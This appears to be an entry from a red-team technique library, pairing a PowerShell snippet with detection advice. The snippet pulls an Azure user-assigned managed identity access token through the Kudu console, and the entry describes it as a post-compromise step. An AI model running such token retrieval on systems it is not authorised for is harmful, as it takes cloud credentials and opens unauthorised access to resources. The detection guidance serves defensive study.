---
type: code
language: powershell
verified: true
created_at: '2023-05-24T07:13:54Z'
updated_at: '2023-05-24T07:13:54Z'
platforms:
  - Cloud
tags:
  - kudu
  - managed-identity
  - token-retrieval
validated: true
---

# kudu-powershell-retrieve-user-assigned-identity-token

## Code

```powershell
# or KUDU Debug Console Powershell - User Assigned Managed Identity
# Include a client_id or principal_id
$resourceURI = "https://storage.azure.com/"
$client_id = "z5869087-1332-5937-zb1z-xxxxxxxxxx"
$tokenAuthURI = $env:IDENTITY_ENDPOINT + "?resource=$resourceURI&client_id=$client_id&api-version=2019-08-01"
$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"X-IDENTITY-HEADER"="$env:IDENTITY_HEADER"} -Uri $tokenAuthURI
$accessToken = $tokenResponse.access_token
$accessToken
```

## Description

This PowerShell script fetches an access token for a user-assigned Managed Identity using the Kudu debug console. It extends the system-assigned approach by specifying a client_id to target a particular identity, allowing reuse across multiple resources.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $resourceURI | The target Azure resource endpoint | "https://storage.azure.com/" |
| $client_id | The client ID of the user-assigned Managed Identity | "z5869087-1332-5937-zb1z-xxxxxxxxxx" |

## Usage

Run in the Kudu PowerShell console of an Azure App Service with the user-assigned identity attached. Obtain $client_id from the Azure portal under the identity's properties. This is ideal for scenarios where specific permissions are tied to a reusable identity, enabling targeted API access post-compromise.

## Detection

- Audit logs for identity token requests including client_id parameters in Azure Monitor.
- Restrict Kudu access and monitor for PowerShell Invoke-RestMethod calls to identity endpoints.
- Alerts on unusual user-assigned identity usage in Microsoft Sentinel or Defender for Cloud.
- Cross-reference with identity assignment audits to detect unauthorized token extractions.

## Related

- [[procedures/Retrieve-Access-Tokens-from-Azure-Managed-Identity]]
